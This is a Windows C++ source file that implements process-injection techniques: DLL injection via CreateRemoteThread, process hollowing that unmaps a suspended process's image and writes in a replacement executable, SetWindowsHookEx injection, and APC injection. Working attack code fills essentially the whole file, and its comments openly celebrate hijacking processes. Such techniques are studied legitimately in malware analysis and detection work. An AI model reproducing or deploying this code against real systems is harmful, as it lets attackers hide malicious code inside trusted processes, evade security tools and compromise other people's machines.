#include <Windows.h>
#include "Injection.h"
#include <ostream>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <Winternl.h>
#include <fstream>
#include <future>
#include <filesystem>

#define RTN_OK 0
#define RTN_USAGE 1
#define RTN_ERROR 13
using namespace std;
#define DEBUG

// https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/

void DbgPrint(char *msg)
{
#ifdef DEBUG
	cout << "Error: " << msg << endl;
#endif
}

BOOL FindProcess(PCWSTR exeName, DWORD& pid, vector<DWORD>& tids) {
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	pid = 0;

	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32First(hSnapshot, &pe)) {
		do {
			if (_wcsicmp(pe.szExeFile, exeName) == 0) {
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (Thread32First(hSnapshot, &te)) {
					do {
						if (te.th32OwnerProcessID == pid) {
							tids.push_back(te.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}

BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
{
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	/* Snapshot of processes */
	DWORD processId{};
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Fucking lazy auto bullshit, also snap all processes
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	PROCESSENTRY32 pe{}; /* Describes an entry from a list of the processes residing
						 in the system address space when a snapshot was taken.
						 The size of the structure, in bytes. Before calling the
						 Process32First function, set this member to sizeof(PROCESSENTRY32).
						 If you do not initialize dwSize, Process32First fails. (msdn) */
	
	pe.dwSize = sizeof PROCESSENTRY32;
		/* MSDN:
		The size of the structure, in bytes. Before calling the Process32First 
		function, set this member to sizeof(PROCESSENTRY32). 
		If you do not initialize dwSize, Process32First fails.*/


	/* get first PID */
	if (Process32First(hSnapshot, &pe) == FALSE)  //Get first "link" I guess
	{
		CloseHandle(hSnapshot);
		DbgPrint("unable to take first process snapshot");
		return FALSE;
	}

	if (_wcsicmp(pe.szExeFile, processname) == 0) // if pe.szExeFile and Processname are the same
	{
		CloseHandle(hSnapshot);
		processId = pe.th32ProcessID;
	}
	/* End get first PID */

	/* Get the rest and process like the first */
	while (Process32Next(hSnapshot, &pe))
	{
		if (_wcsicmp(pe.szExeFile, processname) == 0)
		{
			CloseHandle(hSnapshot);
			processId = pe.th32ProcessID;
		}
	}

	/* this portion get it and puts it in the memory of the remote process */
	// get size of the dll's path
	auto size = wcslen(lpdllpath) * sizeof(TCHAR);
	
	// open selected process
	auto hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);
	if (hVictimProcess == NULL) // check if process open failed
	{
		DbgPrint("Failed to open process");
		return FALSE;
	}

	// allocate memory in the remote process
	auto pNameInVictimProcess = VirtualAllocEx(hVictimProcess, 
													nullptr,
														size, 
						MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pNameInVictimProcess == NULL) //Check if allocation failed
	{
		DbgPrint("allocation of memory failed, WFT?");
		return FALSE;
	}

	// write the DLL to memory
	auto bStatus = WriteProcessMemory(hVictimProcess, 
								pNameInVictimProcess, 
										   lpdllpath, 
												size, 
												nullptr);
	if (bStatus == 0)
	{
		DbgPrint("failed to write memory to the process");
		return FALSE;
	}

	
	// gets a handle for kernel32dll's LoadLibrary call
	auto hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL)
	{
		DbgPrint("Unable to find Kernel32 in process, what the fuck did you do?");
	}
	auto LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	if (LoadLibraryAddress == NULL) //Check if GetProcAddress works; if not try some ugly as sin correction code
	{
		DbgPrint("Unable to find LoadLibraryW, What is this: Windows 2000?");
		DbgPrint("Trying LoadLibraryA");
		if ((LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA")) == NULL)
		{
			DbgPrint("LoadLibraryA failed as well. You're on your own.");
			return FALSE;
		}
	}
	
	
	// Using the above objects execute the DLL in the remote process
	auto hThreadId = CreateRemoteThread(hVictimProcess, 
		nullptr, 
		0, 
		reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryAddress), 
		pNameInVictimProcess, 
		NULL, 
		nullptr);
	if (hThreadId == NULL)
	{
		DbgPrint("failed to create remote process");
	}

	/*if (bStatus == NULL)
		return FALSE; 
		NOT NEEDED ANYMORE*/ 
	WaitForSingleObject(hThreadId, INFINITE);

	CloseHandle(hVictimProcess);
	VirtualFreeEx(hVictimProcess, pNameInVictimProcess, size, MEM_RELEASE);

	DbgPrint("Injected Successfully");
	return TRUE;
}

void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
{
	this->size_ids = size_ids_;
	this->size_dos_stub = size_dos_stub_;
	this->size_inh32 = size_inh32_;
	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
	this->size_sections = size_sections_;
}

tuple<bool, char*, streampos> OpenBinary(wstring filename)
{
	auto flag = false;	// assume failure
	fstream::pos_type size{};  // create filesize as fstream object
	char* bin{}; // create char pointer object


	ifstream ifile(filename, ios::binary | ios::in | ios::ate);
	if (ifile.is_open())
	{
		size = ifile.tellg();  // set size to current filepointer location (tellg method of istream)
		bin = new char[size];  //create (in stack) the new char buffer for the binry 
		//Standard get filezise algorithm
		ifile.seekg(0, ios::beg); 
		ifile.read(bin, size);
		ifile.close();
		//Assuming we got this far it's okay to assume this worked!
		flag = true;
	}
	return make_tuple(flag, bin, size); // return tuple of gathered data
}

PE_FILE ParsePE(const char* PE)
{
	PE_FILE pefile{};
	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
	pefile.MS_DOS_STUB = vector<char>(stub_size);
	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);

	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
	pefile.ish = vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // Number of sections

	auto PE_Header = PE + pefile.ids.e_lfanew;
	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header

																								 // copy section headers
	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
	}

	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		shared_ptr<char> t_char(new char[pefile.ish[i].SizeOfRawData]{}, std::default_delete<char[]>()); // Section
		memcpy_s(t_char.get(), pefile.ish[i].SizeOfRawData, PE + pefile.ish[i].PointerToRawData, pefile.ish[i].SizeOfRawData); // copy sections.
		pefile.Sections.push_back(t_char);
	}
	size_t sections_size{};
	for (WORD i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		sections_size += pefile.ish[i].SizeOfRawData;
	}

	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

	return pefile;
}

// Based on John Leitch's paper "Process Hollowing"
BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
{

	tuple<bool, char*, fstream::pos_type>  bin = OpenBinary(inj_exe);
	if (!get<0>(bin)) // verify that tuple exists (file is open)
	{
		cout << "Error to open file";
		return EXIT_FAILURE;
	}

	char* PE_file = get<1>(bin); // get pointer to binary as char array
	size_t size_of_pe = get<2>(bin);  //get the filesize from the OpenBinary call

	auto Parsed_PE = ParsePE(PE_file);  // Get the PE_FILE object from the function (local, not a standard C++ function)
										// PE_FILE is defined in the Injection.h file

	auto pStartupInfo = new STARTUPINFO();  // Specifies the window station, desktop, standard handles, 
											// and appearance of the main window for a process at creation time.
											// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx

	auto remoteProcessInfo = new PROCESS_INFORMATION();  // Structure that contains the information about a process object
													// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
	
	/* CreateProcess is a complex call so I am breaking it out into paramaters*/
	//MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx

	CreateProcess(target,			//lpApplicationName		name of process to be executed
		nullptr,					//lpCommandLine			command line to be executed (not used so Application name is used)
		nullptr,					//lpProcessAttributes	user specified process params using SECURITY_ATTRIBUTES struct
		nullptr,					//lpThreadAttributes	user specified thread params using SECURITY_ATTRIBUTES struct
		FALSE,						//bInheritHandles		Disallow the inheritance of process handles to child processes (we are not a child thread)
		NORMAL_PRIORITY_CLASS,		//dwCreationFlags		Flag to priotiry level of the process (here we are normal)
		nullptr,					//lpEnvironment			Enviromental Vars to hand to the new process (perhaps useful for modified mimikatz?)
		nullptr,					//lpCurrentDirectory	used to declare working directory for process (normally used by shells that need to start at $HOME)
		pStartupInfo,				//lpStartupInfo			Our startupinfo object for process info
		remoteProcessInfo);				//lpProcessInformation	The processinformation object we use to manipulate the process

	if (!remoteProcessInfo->hProcess)	// no real need to check the output of Create Process because all the return info needs to be checked anyway
	{
		DbgPrint("Failed to create remote thread");
		return FALSE;
	}
	if (SuspendThread(remoteProcessInfo->hThread) == -1)	//Suspend thread to hijack
	{
		DbgPrint("Failed to stop remote process");
		return FALSE;
	}

	DWORD dwReturnLength;	//used later in remote call

	// read remote PEB
	PROCESS_BASIC_INFORMATION ProcessBasicInformation; //Because having 3 diffrent processinfo structures makes sense

	// get NtQueryInformationProcess
	auto handleToRemoteNtDll = LoadLibrary(L"ntdll");	//Locate NTDLL in new process memory
	if (!handleToRemoteNtDll)
	{
		DbgPrint("failed to get remote handle to NTDLL");
		return FALSE;
	}
	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	if (!fpNtQueryInformationProcess)
	{
		DbgPrint("Failed to locate remote NtQueryInformationProcess function");
		return FALSE;
	}
	//Cast into useable function, thanks C++ template hacks! 
	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);

	//Call remote process NtQueryInformationProcess function
	remoteNtQueryInformationProcess(remoteProcessInfo->hProcess, 
		PROCESSINFOCLASS(0), 
		&ProcessBasicInformation, 
		sizeof(PROCESS_BASIC_INFORMATION), 
		&dwReturnLength);
	
	auto dwPEBBAddress = ProcessBasicInformation.PebBaseAddress; //remote PEB info

	auto pPEB = new PEB(); //create new PEB object

	if (!ReadProcessMemory(remoteProcessInfo->hProcess,	// load info for PEB of remote process 
		static_cast<LPCVOID>(dwPEBBAddress),
		pPEB,
		sizeof(PEB),
		nullptr))
	{
		DbgPrint("failed to load remote PEB");
		return FALSE;
	}

	// remote image size calculation
	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;
	
	// Create new buffer to hold new process
	//I will admit having a BYTE type in windows is pretty nice, I think it just resolves into an unsigned char tho...
	auto remoteProcessBuffer = new BYTE[BUFFER_SIZE];

	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote processes' image base
	
	if (!ReadProcessMemory(remoteProcessInfo->hProcess, // read process image from loaded process (so we can replace these parts later)
		remoteImageAddressBase, 
		remoteProcessBuffer, 
		BUFFER_SIZE, 
		nullptr))
		return FALSE;

	// get handle to unmap remote process sections for replacement
	auto fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
	
	//Create callable version of remote unmap call
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	//Unmap remote process image (oh boy we are hijacking this shit now!)
	if (ZwUnmapViewOfSection(remoteProcessInfo->hProcess, const_cast<PVOID>(remoteImageAddressBase)))
		return FALSE;

	// Allocating memory for our PE file
	/* 
	another complex call that we will now disect 
	MSDN: https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa366890(v=vs.85).aspx
	*/
	// TODO: allocate this memory as read write and then remove the write flag and replace with exec flag
	
	auto pRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,		//hProcess			handle to the remote process
		const_cast<LPVOID>(remoteImageAddressBase),						//lpAddress			address to allocate at (here we are using the old process image base address)
		Parsed_PE.inh32.OptionalHeader.SizeOfImage,						//dwSize			size of  allocation (our new pe's length goes here 
		MEM_COMMIT | MEM_RESERVE,										//flAllocationType	The type of memory allocation this part is system magic so RTFM at MSDN
		PAGE_EXECUTE_READWRITE);										//flProtect			Tell the kernel to allocate with these protections, which is none so... "RAWDOG IT!!!"
	
	if (!pRemoteImage)	//if the call screws up then just die
	{
		DbgPrint("failed to allocate memory in remote process");
		return FALSE;
	}

	// calculate relocation delta
	auto dwDelta = ULONGLONG(remoteImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;  // change to pImageAddressBase

	//Here we cast the new process to a function pointer that we will cause the remote process to execute
	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(remoteImageAddressBase);

	
	if (!WriteProcessMemory(remoteProcessInfo->hProcess,		//hProcess					the handle to the remote process
		const_cast<LPVOID>(remoteImageAddressBase),				//lpBaseAddress				The address to start writing to
		PE_file,												//lpBuffer					the buffer to write to the process
		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,			//nSize						number of bytes to write
		nullptr))												//lpNumberOfBytesWritten	(unused) int pointer to write the return value to
	{
		DbgPrint("failed to write new headers to remote process memory");
		return FALSE;
	}

	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
	{
		auto VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);

		if (!WriteProcessMemory(remoteProcessInfo->hProcess,	//write new sections to the remote processes' memory 
			VirtAddress,
			Parsed_PE.Sections[i].get(),
			Parsed_PE.ish[i].SizeOfRawData,
			nullptr))
		{
			DbgPrint("failed to write new process section");
			return FALSE;
		}
	}

	// if delta > 0  - todo

	// cast new callable entry point from remote process base address
	auto dwEntrypoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;


	LPCONTEXT remoteProcessContext = new CONTEXT();		//This is a debugging structure to hold the old process "context" like registers and whatnot
	remoteProcessContext->ContextFlags = CONTEXT_ALL;	//I actually don't know what this flag is used for, research time!


	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))	//get context to be used to restore process
	{
		DbgPrint("Failed to get debugging context of remote process");
		return FALSE;
	}

	remoteProcessContext->Rcx = dwEntrypoint;			//Set RCX register to the EntryPoint
	remoteProcessContext->ContextFlags = CONTEXT_FULL;	//Otherwise restore normal context

	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		DbgPrint("failed to set remote process context");
		return FALSE;
	}
	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		DbgPrint("failed to set control thread context");
		return FALSE;
	}


	if (!ResumeThread(remoteProcessInfo->hThread))
	{
		DbgPrint("failed to resume remote process");
		return FALSE;
	}

	  ////////////////////////////////////////////////////////
	 //////AND THATS IT, WE HAVE HIJACKED A PROCESS!!!!//////
	////////////////////////////////////////////////////////

	CloseHandle(remoteProcessInfo->hProcess); //clean up when you are done, it's only polite.
	//TerminateProcess(pProcessInfo->hProcess, 0);
	return TRUE;
}

BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
{
	// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
	// SetWindowsHookEx can be used to inject a DLL into another process. A 32 - bit DLL cannot be injected into a 64 - bit process, 
	// and a 64 - bit DLL cannot be injected into a 32 - bit process.If an application requires the use of hooks in other processes, 
	// it is required that a 32 - bit application call SetWindowsHookEx to inject a 32 - bit DLL into 32 - bit processes, 
	// and a 64 - bit application call SetWindowsHookEx to inject a 64 - bit DLL into 64 - bit processes.The 32 - bit and 64 - bit DLLs must have different names.

	auto hdll = LoadLibrary(dll_name);

	typedef LRESULT(WINAPI * MyProc)(int code, WPARAM wp, LPARAM lp); // export from calc_dll.dll

	auto mp = MyProc(GetProcAddress(hdll, "MyProc"));

	auto pStartupInfo = new STARTUPINFO();
	auto pProcessInfo = new PROCESS_INFORMATION();
	CreateProcess(target, nullptr, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, pStartupInfo, pProcessInfo);
	if (!pProcessInfo->hProcess)
		return FALSE;

	auto hProc = SetWindowsHookEx(WH_CBT, mp, hdll, pProcessInfo->dwThreadId);

	UnhookWindowsHookEx(hProc);

	return TRUE;
}

BOOL APCinjection(TCHAR target[], TCHAR *dll_name) {
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	DWORD pid{};
	vector<DWORD> tids{};

	if (!FindProcess(target, pid, tids))
		return FALSE;
	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
		return FALSE;
	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
		return FALSE;
	for (const auto &tid : tids) {
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		if (hThread) {
			QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"), hThread, (ULONG_PTR)pVa);
			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
}